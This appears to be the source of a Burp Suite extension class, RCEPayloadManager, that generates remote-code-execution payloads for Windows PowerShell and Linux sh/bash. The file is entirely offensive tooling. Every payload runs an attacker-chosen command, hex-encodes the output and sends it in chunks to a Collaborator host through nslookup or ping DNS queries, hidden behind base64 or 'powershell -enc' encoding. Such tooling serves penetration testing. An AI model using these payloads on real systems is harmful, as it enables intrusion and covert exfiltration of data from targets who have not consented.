package burp;

import java.util.Base64;
import java.nio.charset.StandardCharsets;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.logging.Logging;

public class RCEPayloadManager {
    private final CollaboratorClient collaboratorClient;
    private final Logging logging;
    
    public RCEPayloadManager(CollaboratorClient collaboratorClient, Logging logging) {
        this.collaboratorClient = collaboratorClient;
        this.logging = logging;
    }

    public String createPayload(String osType, String command, String collaboratorPayload) {
        String payload = "";
        
        switch (osType) {
            case "Windows PowerShell":
                payload = createPowershellPayload(command, collaboratorPayload);
                break;
            case "Linux (sh + ping)":
                payload = createShPingPayload(command, collaboratorPayload);
                break;
            case "Linux (sh + nslookup)":
                payload = createShNslookupPayload(command, collaboratorPayload);
                break;
            case "Linux (bash + ping)":
                payload = createBashPingPayload(command, collaboratorPayload);
                break;
            case "Linux (bash + nslookup)":
                payload = createBashNslookupPayload(command, collaboratorPayload);
                break;
        }
        
        return payload;
    }

    private String createPowershellPayload(String command, String collaboratorPayload) {
        String psCommand = String.format(
            "$s=63;$d=\".%s\";$b=-join([BitConverter]::ToString([Text.Encoding]::ASCII.GetBytes((%s)))).Replace(\"-\", \"\");" +
            "$c=[math]::floor($b.length/$s);0..$c|%%{" +
            "$e=$_*$s;" +
            "$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)});" +
            "if($r.length -gt 0){" +
            "$c=$_.ToString().PadLeft(4,\"0\");" +
            "nslookup $c\".\"$r$d" +
            "}}",
            collaboratorPayload,
            command
        );
        return "powershell -enc " + Base64.getEncoder().encodeToString(psCommand.getBytes(StandardCharsets.UTF_16LE));
    }

    private String createShPingPayload(String command, String collaboratorPayload) {
        String shCommand = command + "|od -A n -t x1|sed 's/ //g'|" +
            "while read exfil; do " +
            "if [ ! -z \"$exfil\" ]; then " +
            "ping -c1 `printf %04d $i`.$exfil." + collaboratorPayload + "&" +
            "let i=i+1;echo;" +
            "fi; done";
        return "echo " + Base64.getEncoder().encodeToString(shCommand.getBytes(StandardCharsets.UTF_8)) + "|base64 -d|sh";
    }

    private String createShNslookupPayload(String command, String collaboratorPayload) {
        String shCommand = "i=0;d=\"" + collaboratorPayload + "\";" +
            command + "|od -A n -t x1|sed 's/ //g'|" +
            "while read j; do " +
            "if [ ! -z \"$j\" ]; then " +
            "nslookup \"$(printf '%04d' $i).$j.$d\";" +
            "((i++));" +
            "fi; done";
        return "echo " + Base64.getEncoder().encodeToString(shCommand.getBytes(StandardCharsets.UTF_8)) + "|base64 -d|sh";
    }

    private String createBashPingPayload(String command, String collaboratorPayload) {
        String bashCommand = command + "|od -A n -t x1|sed 's/ //g'|" +
            "while read exfil; do " +
            "if [ ! -z \"$exfil\" ]; then " +
            "ping -c1 `printf %04d $i`.$exfil." + collaboratorPayload + "&" +
            "let i=i+1;echo;" +
            "fi; done";
        return "echo " + Base64.getEncoder().encodeToString(bashCommand.getBytes(StandardCharsets.UTF_8)) + "|base64 -d|bash";
    }

    private String createBashNslookupPayload(String command, String collaboratorPayload) {
        String bashCommand = "i=0;d=\"" + collaboratorPayload + "\";" +
            command + "|od -A n -t x1|sed 's/ //g'|" +
            "while read j; do " +
            "if [ ! -z \"$j\" ]; then " +
            "nslookup \"$(printf '%04d' $i).$j.$d\";" +
            "((i++));" +
            "fi; done";
        return "echo " + Base64.getEncoder().encodeToString(bashCommand.getBytes(StandardCharsets.UTF_8)) + "|base64 -d|bash";
    }
}